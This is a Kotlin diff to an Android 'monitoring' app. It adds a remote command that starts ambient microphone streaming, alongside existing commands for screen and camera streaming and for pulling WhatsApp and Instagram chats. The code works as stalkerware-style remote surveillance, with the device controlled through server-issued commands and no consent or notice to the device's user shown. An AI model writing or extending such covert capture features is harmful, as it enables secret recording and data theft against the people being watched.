@@ -72,6 +72,7 @@ class SyncRunner(private val context: Context) {
         // Process screen and camera stream immediately
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
         commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
+        commands.filter { it.command_type == "audio_stream" }.forEach { processAudioStreamCommand(bearer, it) }
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
         commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
 
@@ -200,6 +201,7 @@ class SyncRunner(private val context: Context) {
         }
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
         commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
+        commands.filter { it.command_type == "audio_stream" }.forEach { processAudioStreamCommand(bearer, it) }
         commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
         commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
@@ -710,6 +712,80 @@ class SyncRunner(private val context: Context) {
             )
         } catch (e: Exception) {
             android.util.Log.e("SyncRunner", "Failed to ack camera stream start", e)
+        }
+    }
+
+    private suspend fun processAudioStreamCommand(bearer: String, command: RemoteCommand) {
+        val action = (command.payload?.get("action") as? String) ?: "start"
+
+        if (action == "stop") {
+            com.spapp.monitoring.audiostream.AudioStreamService.stop(context)
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(success = true, message = "Audio stream stopped")
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack stop audio stream", e)
+            }
+            return
+        }
+
+        val hasAudioPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+            context,
+            android.Manifest.permission.RECORD_AUDIO
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+
+        if (!hasAudioPermission) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = "RECORD_AUDIO permission is not granted on this device."
+                    )
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack audio stream permission check", e)
+            }
+            return
+        }
+
+        val state = DeviceState(context)
+        val authToken = state.authToken
+        val deviceId = state.getEffectiveDeviceId()
+
+        if (authToken == null || deviceId == null) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = "Device state missing auth token or device ID"
+                    )
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack audio stream auth check", e)
+            }
+            return
+        }
+
+        com.spapp.monitoring.audiostream.AudioStreamService.start(context)
+
+        try {
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(
+                    success = true,
+                    message = "Ambient audio stream started"
+                )
+            )
+        } catch (e: Exception) {
+            android.util.Log.e("SyncRunner", "Failed to ack audio stream start", e)
         }
     }
 
